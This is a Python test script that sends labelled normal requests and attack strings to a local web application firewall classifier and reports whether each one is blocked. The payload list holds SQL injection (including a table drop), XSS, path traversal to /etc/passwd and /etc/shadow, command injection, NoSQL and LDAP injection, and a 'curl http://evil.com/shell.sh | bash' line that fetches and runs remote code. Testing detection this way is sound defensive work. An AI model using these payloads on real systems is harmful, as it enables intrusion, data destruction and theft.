import requests
import time
import json

url = "http://127.0.0.1:10001/predict"

payloads = [
    # Normal traffic
    {"name": "Normal Search", "q": "how to learn deep learning"},
    {"name": "Normal Page", "page": "about_us.html", "id": "123"},
    
    # SQLi
    {"name": "SQL Injection 1", "user": "admin' OR '1'='1", "pass": "password"},
    {"name": "SQL Injection 2", "id": "1; DROP TABLE users--"},
    
    # XSS
    {"name": "XSS Attack 1", "comment": "<script>alert('XSS')</script>"},
    {"name": "XSS Attack 2", "search": "\"><img src=x onerror=prompt(1)>"},
    
    # LFI/Traversal
    {"name": "Path Traversal", "file": "../../../../etc/passwd"},
    {"name": "LFI", "include": "/var/www/html/../../../etc/shadow"},
    
    # RCE
    {"name": "RCE Attack 1", "cmd": "eval(base64_decode('somepayload'))"},
    {"name": "RCE Attack 2", "exec": "curl http://evil.com/shell.sh | bash"},
    
    # Advanced / Obfuscated
    {"name": "Double URL Encoded XSS", "q": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
    {"name": "Normal Login", "username": "jdoe", "password": "securepassword123"},
    {"name": "SQL Injection Union", "id": "1' UNION SELECT 1, version() --"},
    {"name": "SVG XSS", "profile_pic": "<svg/onload=alert(1)>"},
    {"name": "Command Injection Pipe", "ip": "127.0.0.1 | cat /etc/passwd"},
    {"name": "Windows Path Traversal", "doc": "..\\..\\windows\\system32\\drivers\\etc\\hosts"},
    {"name": "NoSQL Injection", "user": "admin", "password": "{\"$ne\": null}"},
    {"name": "LDAP Injection", "user": "*)(uid=*))(|(uid=*"},
]

print("Simulating attacker traffic against WAF Server...\n")

for p in payloads:
    test_name = p.pop("name")
    print(f"[*] Testing: {test_name}")
    print(f"    Payload: {p}")
    
    start_time = time.time()
    try:
        # We send as JSON so it's easier to parse, but the server supports both
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(p), headers=headers)
        elapsed_time = time.time() - start_time
        
        result = response.json()
        
        status = result.get('status')
        attack_type = result.get('type')
        
        if status == "ATTACK":
            print(f"    [!] BLOCKED. Detected as: {attack_type.upper()}")
        else:
            print(f"    [+] ALLOWED. Status: {status.upper()} ({attack_type})")
        print(f"    [i] Time taken: {elapsed_time:.6f}s")
            
    except Exception as e:
        print(f"    [-] Error: {e}")
    print("-" * 50)
    time.sleep(0.5)
